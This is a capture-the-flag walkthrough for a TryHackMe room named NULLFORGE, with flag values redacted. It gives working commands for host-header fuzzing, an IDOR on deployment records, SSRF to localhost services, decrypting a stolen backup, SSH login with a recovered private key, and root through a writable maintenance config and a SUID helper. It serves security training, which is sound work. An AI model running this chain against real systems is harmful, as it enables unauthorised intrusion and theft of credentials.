# NULLFORGE — Official Public Walkthrough

> **Room:** NULLFORGE  
> **Platform:** TryHackMe  
> **URL:** https://tryhackme.com/room/nullforge  
> **Difficulty:** Hard  
> **Type:** Challenge / Boot2Root  
> **Target solve time:** ~120 minutes  
> **Flags:** 10

---

## ⚠️ Spoiler Notice

This is the **official solution walkthrough** for NULLFORGE.

It intentionally explains the intended attack path, the reasoning behind each stage, the relevant commands, and the expected discoveries.

To keep the room meaningful for players who have not yet completed it, **flag values, the target IP, and secret-derived values are intentionally redacted** as `****`.

The goal of this document is to explain **how to solve the room**, not to publish the answer strings.

---

# 1. Challenge Overview

NULLFORGE is designed as a chained Linux attack path. Each stage reveals just enough information to make the next stage possible.

The intended progression is:

```text
External reconnaissance
        |
        v
Public web application
        |
        v
Virtual-host discovery
        |
        v
Deployment console
        |
        v
Broken object authorization
        |
        v
Internal Operations API
        |
        v
SSRF
        |
        v
Internal Forge
        |
        v
Backup service
        |
        v
Encrypted backup
        |
        v
SSH private key
        |
        v
ops foothold
        |
        v
systemd timer
        |
        v
Writable maintenance configuration
        |
        v
Root-controlled hook
        |
        v
SUID helper
        |
        v
root
```

The challenge is deliberately layered. A player should not need to guess the final privilege escalation from the beginning; each discovery is intended to provide the clue for the next step.

---

# 2. What You Need

A normal attacker workstation with:

- Nmap
- curl
- ffuf
- OpenSSL
- tar
- SSH

Kali Linux is suitable, but the commands are not dependent on Kali-specific tooling except where noted.

Throughout this walkthrough:

```text
MACHINE_IP
```

means the IP address assigned to the NULLFORGE target by TryHackMe.

Do **not** replace `MACHINE_IP` inside the target itself. Run the commands from your attacker machine unless stated otherwise.

---

# Task 1 — THE FIRST SIGNAL

## 3. Initial Reconnaissance

Start by identifying the external attack surface.

```bash
nmap -Pn -sC -sV -p- MACHINE_IP
```

### What you are looking for

The intended externally reachable services are:

```text
22/tcp  SSH
80/tcp  HTTP
```

The deeper application services are intentionally bound to localhost, so they should **not** appear as directly reachable network services from your attacker machine.

This distinction is important.

If you only see the public services, that does not mean the other services do not exist. It means you need to find a way to make the target access them on your behalf later.

---

## 4. Enumerate the Web Application

Open the main web service:

```bash
curl -i http://MACHINE_IP/
```

Read the response instead of immediately starting large directory brute-forcing.

The public application exposes several interesting routes, including:

```text
/status
/docs/operations
/fetch?url=
/assets/ops-manifest.json
```

The endpoint:

```text
/fetch?url=
```

is especially important later.

For the first flag, retrieve the exposed manifest:

```bash
curl -s http://MACHINE_IP/assets/ops-manifest.json
```

Inspect the complete response.

The manifest contains application/build information and the first flag.

### Flag 01

```text
THM{NULLFORGE::01::****}
```

> **Learning point:** Publicly accessible static files, manifests, health endpoints, JavaScript, and documentation often reveal more about an application than the homepage itself.

---

# Task 2 — THE RECORD THAT SHOULDN'T EXIST

## 5. Discover the Hidden Virtual Host

The public application gives enough hints to suspect that another web application exists behind a different virtual host.

A useful next step is lightweight Host-header enumeration.

Create a small candidate list:

```bash
printf "www\nadmin\nportal\nconsole\nops\ndev\nstatus\ninternal\n" > /tmp/nullforge-vhosts.txt
```

Run ffuf against the target:

```bash
ffuf \
  -u http://MACHINE_IP/ \
  -H "Host: FUZZ.nullforge.internal" \
  -w /tmp/nullforge-vhosts.txt \
  -fs 1609
```

### Why `-fs 1609`?

The public/default response produces a repeatable response size. Filtering that size helps separate the default site from the meaningful virtual-host response.

The important discovery is:

```text
console.nullforge.internal
```

Add the virtual host to `/etc/hosts` on your attacker machine:

```bash
echo "MACHINE_IP console.nullforge.internal" | sudo tee -a /etc/hosts
```

Then request it directly:

```bash
curl -i http://console.nullforge.internal/
```

You have now moved from the public web application to the **deployment console**.

---

## 6. Inspect the Deployment API

The console exposes deployment records through an API.

Start with the visible deployment identifier:

```text
NF-2026-041
```

Request it:

```bash
curl -s \
  http://console.nullforge.internal/api/v1/deployments/NF-2026-041
```

Read the JSON carefully.

The important observation is that deployment identifiers are accepted directly by the application and the authorization boundary is not correctly enforced.

In other words, knowing or discovering another object identifier is enough to request it.

This is a classic **broken object-level authorization / IDOR-style** condition.

Request the related record:

```bash
curl -s \
  http://console.nullforge.internal/api/v1/deployments/NF-2026-042
```

The second deployment should reveal information that is not intended to be exposed through the visible deployment.

It includes an internal Operations service:

```text
http://127.0.0.1:8081
```

### Flag 02

```text
THM{NULLFORGE::02::****}
```

### Hidden Deployment

```text
NF-2026-042
```

### Flag 03

```text
THM{NULLFORGE::03::****}
```

> **Learning point:** Object authorization must be checked on the server for every requested object. An unpredictable identifier is not an authorization control.

---

# Task 3 — THE SERVICE BEHIND THE WALL

## 7. Recognize the SSRF Primitive

At this point you have discovered a service that only listens on localhost:

```text
127.0.0.1:8081
```

Your attacker machine cannot directly connect to it.

Return to the public application's remote-fetch feature:

```text
/fetch?url=
```

Test whether the server will request the internal endpoint for you:

```bash
curl -i \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/health"
```

If the response contains the internal service response, you have confirmed **server-side request forgery (SSRF)**.

The important idea is:

```text
Attacker
   |
   v
Public web server
   |
   v
127.0.0.1:8081
```

The request to `127.0.0.1` is executed from the target server, not from your workstation.

---

## 8. Enumerate the Operations API

Use the SSRF primitive to reach the diagnostic endpoint:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/diagnostics"
```

Inspect the response.

The fourth flag is exposed here.

### Flag 04

```text
THM{NULLFORGE::04::****}
```

Next, enumerate the internal service registry:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/registry"
```

The registry identifies additional localhost services:

```text
Forge   127.0.0.1:8082
Backup  127.0.0.1:9090
```

This registry is effectively your internal service map.

---

## 9. Reach the Internal Forge

Because the same SSRF primitive can access localhost services, request the Forge API:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/projects/nightly-backup"
```

The returned project information points toward the nightly backup workflow.

Retrieve the artifact manifest:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/artifacts/nightly-manifest.json"
```

The manifest identifies the backup backend and contains the fifth flag.

### Flag 05

```text
THM{NULLFORGE::05::****}
```

> **Learning point:** SSRF is often more useful as an internal network-discovery primitive than as a single request. Once a server can reach localhost, look for service registries, health endpoints, metadata, APIs, and administrative interfaces.

---

# Task 4 — THE ARCHIVE THAT REMEMBERS

## 10. Discover the Backup Service

The Operations registry exposed:

```text
127.0.0.1:9090
```

Use the existing SSRF to access the backup service:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/backups/latest"
```

The response reveals a nightly backup artifact and metadata similar to:

```text
artifact: nightly-****-**-**.tar.gz.enc
encryption: AES-256-CBC
job: nightly-backup
```

It also contains the sixth flag.

### Flag 06

```text
THM{NULLFORGE::06::****}
```

---

## 11. Retrieve the Encrypted Backup

Download the archive through SSRF:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/download/nightly-2026-09-24" \
  -o /tmp/nightly-backup.tar.gz.enc
```

At this point you have an encrypted archive.

Do **not** start password brute-forcing.

The intended route is to discover how the backup system constructs its passphrase.

---

## 12. Discover the Backup Encryption Rule

The internal Forge repository exposes the backup policy:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/repositories/ops-backup-config/files/backup-policy.json"
```

Look for fields describing:

```text
cipher
KDF
passphrase_rule
```

The policy defines:

```text
cipher: AES-256-CBC
KDF: PBKDF2
passphrase_rule: latest_commit + job_start_hhmm
```

This is the key clue.

The passphrase is not a random secret.

It is derived from two values exposed by the application's backup configuration:

```text
latest_commit + job_start_hhmm
```

The walkthrough intentionally redacts the actual values:

```text
latest commit: ****
job start:     **:**
```

Therefore the final passphrase should be constructed by concatenating those values:

```text
passphrase = <latest_commit><job_start_hhmm>
```

There is no intended need for password brute force.

> **Learning point:** When an application tells you a key-derivation rule, treat it as a data-recovery problem before treating it as a cracking problem.

---

## 13. Decrypt the Archive

Use OpenSSL with the parameters disclosed by the backup policy:

```bash
openssl enc \
  -d \
  -aes-256-cbc \
  -pbkdf2 \
  -iter 200000 \
  -in /tmp/nightly-backup.tar.gz.enc \
  -out /tmp/nightly-backup.tar.gz \
  -pass pass:'<DERIVED_PASSPHRASE>'
```

Then list the archive:

```bash
tar -tzf /tmp/nightly-backup.tar.gz
```

The archive contains the important recovery material, including:

```text
home/ops/.ssh/id_ed25519
README.txt
flag07.txt
```

Create an extraction directory:

```bash
mkdir -p /tmp/nullforge-backup
```

Extract the archive:

```bash
tar -xzf /tmp/nightly-backup.tar.gz -C /tmp/nullforge-backup
```

Read the seventh flag:

```bash
cat /tmp/nullforge-backup/flag07.txt
```

### Flag 07

```text
THM{NULLFORGE::07::****}
```

---

## 14. Recover the SSH Private Key

The backup contains the SSH private key for the `ops` account.

Restrict its permissions:

```bash
chmod 600 /tmp/nullforge-backup/home/ops/.ssh/id_ed25519
```

Use it to authenticate:

```bash
ssh \
  -i /tmp/nullforge-backup/home/ops/.ssh/id_ed25519 \
  ops@MACHINE_IP
```

Confirm the account:

```bash
whoami
```

Expected:

```text
ops
```

Read the user flag:

```bash
cat /home/ops/user.txt
```

### Flag 08

```text
THM{NULLFORGE::08::****}
```

> **Learning point:** Backups frequently contain credentials, keys, configuration files, and historical artifacts that are more privileged than the original application interface.

---

# Task 5 — THE LAST SCHEDULE

## 15. Enumerate the Local System

Now that you have an `ops` shell, switch from web enumeration to local enumeration.

First inspect the current identity and group membership:

```bash
id
```

The account belongs to the maintenance group:

```text
nf-maint
```

This is the clue that the final stage is related to system maintenance.

---

## 16. Enumerate Systemd Timers

Search for relevant timers:

```bash
systemctl list-timers --all | grep nullforge
```

The important timer is:

```text
nullforge-maint.timer
```

Inspect the corresponding service:

```bash
systemctl cat nullforge-maint.service
```

The important service configuration includes:

```text
User=root
EnvironmentFile=/etc/nullforge/maint.env
ExecStart=/usr/local/sbin/nullforge-maint
```

This immediately gives you a critical question:

> What does the root-owned service load from the environment file, and who can modify it?

---

## 17. Inspect the Maintenance Configuration

Read the environment file:

```bash
cat /etc/nullforge/maint.env
```

The important values are:

```text
ROTATION_HOOK=/home/ops/.local/bin/nf-hook
ROTATION_MODE=nightly
```

Now check the permissions:

```bash
ls -l /etc/nullforge/maint.env
```

The file is writable by the `nf-maint` group.

Because your `ops` account belongs to that group, the privileged maintenance process trusts configuration data that can be modified by a low-privileged account.

This is the central privilege-escalation weakness.

---

## 18. Follow the Trusted Hook

The root-controlled maintenance process uses the configured hook path.

The existing hook causes two important effects:

1. It makes the stage-09 flag available to the `ops` account.
2. It changes the permissions of the `nullforge-report` helper so that it becomes SUID.

After the maintenance job runs, read the stage-09 file:

```bash
cat /home/ops/.cache_stage09
```

### Flag 09

```text
THM{NULLFORGE::09::****}
```

---

## 19. Identify the SUID Helper

Inspect the helper:

```bash
ls -l /usr/local/libexec/nullforge-report
```

After the maintenance process has executed, the permissions include the SUID bit:

```text
-rwsr-xr-x
```

You can also search for SUID binaries in the relevant directory:

```bash
find /usr/local/libexec -perm -4000 -type f -ls
```

The intended helper is:

```text
/usr/local/libexec/nullforge-report
```

The important thing to recognize is that this helper runs with elevated effective privileges.

---

## 20. Obtain Root

Execute the SUID helper:

```bash
/usr/local/libexec/nullforge-report
```

Verify your identity:

```bash
whoami
```

Expected:

```text
root
```

Then:

```bash
id
```

A successful escalation should show a root UID:

```text
uid=0(root)
```

---

## 21. Read the Final Flag

The final flag is stored at:

```text
/root/root.txt
```

Read it:

```bash
cat /root/root.txt
```

### Flag 10

```text
THM{NULLFORGE::10::****}
```

You have completed the intended NULLFORGE attack chain.

---

# 22. Complete Attack Chain

For a quick review, the full path is:

```text
[1] Scan target
     |
     v
[2] Public HTTP application
     |
     v
[3] Discover useful endpoints
     |
     v
[4] Enumerate virtual hosts
     |
     v
[5] console.nullforge.internal
     |
     v
[6] Visible deployment: NF-2026-041
     |
     v
[7] Broken object authorization
     |
     v
[8] Hidden deployment: NF-2026-042
     |
     v
[9] Internal Operations API
     |
     v
[10] SSRF via /fetch?url=
     |
     v
[11] Operations registry
     |
     +-----------------------+
     |                       |
     v                       v
[12] Forge :8082          Backup :9090
     |                       |
     v                       v
[13] Backup workflow       Encrypted archive
     |                       |
     +-----------+-----------+
                 |
                 v
[14] Backup policy
                 |
                 v
[15] Derive passphrase
                 |
                 v
[16] Decrypt archive
                 |
                 v
[17] Recover SSH key
                 |
                 v
[18] SSH as ops
                 |
                 v
[19] Enumerate systemd timer
                 |
                 v
[20] Writable maintenance configuration
                 |
                 v
[21] Root-controlled hook
                 |
                 v
[22] SUID helper
                 |
                 v
[23] root
                 |
                 v
[24] /root/root.txt
```

---

# 23. Flag Progression

| Flag | Where it is discovered | Main skill |
|---|---|---|
| 01 | Public application manifest | Web enumeration |
| 02 | Deployment console | API enumeration |
| 03 | Unauthorized deployment record | Broken object authorization |
| 04 | Operations diagnostics | SSRF / internal API discovery |
| 05 | Internal Forge | Internal service enumeration |
| 06 | Backup service | SSRF / backup enumeration |
| 07 | Decrypted backup archive | Cryptographic reasoning |
| 08 | `ops` account | SSH key recovery |
| 09 | Maintenance stage | Local privilege escalation |
| 10 | `/root/root.txt` | Root access |

---

# 24. Why the Chain Works

NULLFORGE is intentionally built as a sequence of trust failures.

### External trust

The public application exposes information that should help an attacker understand the environment.

### Virtual-host trust

A separate deployment console is available through a hidden Host-header route.

### Authorization trust

Deployment objects can be accessed without correctly validating whether the requesting user is authorized to view them.

### Request-routing trust

The public server can be abused to make requests to services bound only to localhost.

### Service trust

Internal services expose additional operational information and backup infrastructure.

### Backup trust

The backup system reveals enough metadata to reconstruct its passphrase.

### Credential trust

The recovered backup contains a private SSH key.

### Local configuration trust

A root-controlled maintenance service consumes configuration writable by a member of a low-privileged group.

### Execution trust

The maintenance workflow causes a helper to become SUID, providing the final privilege boundary bypass.

The challenge therefore moves from:

```text
information disclosure
```

to:

```text
authorization failure
```

to:

```text
server-side request forgery
```

to:

```text
credential recovery
```

to:

```text
local privilege escalation
```

rather than depending on a single one-shot exploit.

---

# 25. Troubleshooting

## The Host-header scan shows every candidate

The default application response can produce a common response size.

Use the size filter demonstrated in the intended enumeration:

```bash
-fs 1609
```

If the returned default size differs in your environment, identify the common baseline response first and filter that instead of blindly copying the number.

---

## `console.nullforge.internal` does not resolve

Add the room's target IP to `/etc/hosts`:

```bash
echo "MACHINE_IP console.nullforge.internal" | sudo tee -a /etc/hosts
```

Then test:

```bash
curl -i http://console.nullforge.internal/
```

---

## The internal API is unreachable directly

That is expected.

The Operations API is intended to be reached through the public application's SSRF functionality:

```text
/fetch?url=
```

---

## The encrypted archive does not decrypt

Check the backup policy again:

```bash
curl -s \
  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/repositories/ops-backup-config/files/backup-policy.json"
```

Verify:

- AES-256-CBC
- PBKDF2
- iteration count
- passphrase construction rule
- commit value
- backup job start time

Do not add extra separators unless the documented rule requires them.

---

## SSH rejects the private key

Ensure the extracted private key has restrictive permissions:

```bash
chmod 600 /tmp/nullforge-backup/home/ops/.ssh/id_ed25519
```

Then connect again:

```bash
ssh \
  -i /tmp/nullforge-backup/home/ops/.ssh/id_ed25519 \
  ops@MACHINE_IP
```

---

## The SUID helper is not SUID yet

The intended path requires the maintenance process to run.

Check the timer:

```bash
systemctl list-timers --all | grep nullforge
```

Then inspect the helper:

```bash
ls -l /usr/local/libexec/nullforge-report
```

The expected post-maintenance state includes:

```text
-rwsr-xr-x
```

---

# 26. Intended Learning Outcomes

By the end of NULLFORGE, the player should have practiced:

- External service enumeration
- Web application reconnaissance
- Virtual-host discovery
- API enumeration
- Broken object-level authorization / IDOR
- SSRF identification and exploitation
- Internal service discovery
- Backup and artifact enumeration
- Reading application configuration
- Deterministic secret derivation
- OpenSSL archive decryption
- SSH private-key recovery
- Linux identity and group enumeration
- systemd timer/service inspection
- Writable privileged configuration analysis
- SUID privilege escalation

---

# 27. Final Notes for Players

The room is intended to reward **reading and correlation**.

Several important clues are not hidden behind complicated exploitation. They are exposed through:

```text
HTTP responses
JSON records
service registries
backup policy
systemd configuration
file permissions
```

When you discover a new piece of infrastructure, ask:

```text
What does this service know?
What other service does it reference?
What does it trust?
Who can modify that trust relationship?
What does the next layer expose?
```

That mindset is the core of NULLFORGE.

---

## Completion Checklist

You have completed the intended path when you can account for all ten milestones:

```text
[ ] Flag 01 — Public manifest
[ ] Flag 02 — Deployment console
[ ] Flag 03 — Hidden deployment
[ ] Flag 04 — Operations API
[ ] Flag 05 — Internal Forge
[ ] Flag 06 — Backup service
[ ] Flag 07 — Encrypted backup
[ ] Flag 08 — ops foothold
[ ] Flag 09 — Maintenance privilege stage
[ ] Flag 10 — root
```

**NULLFORGE complete.**
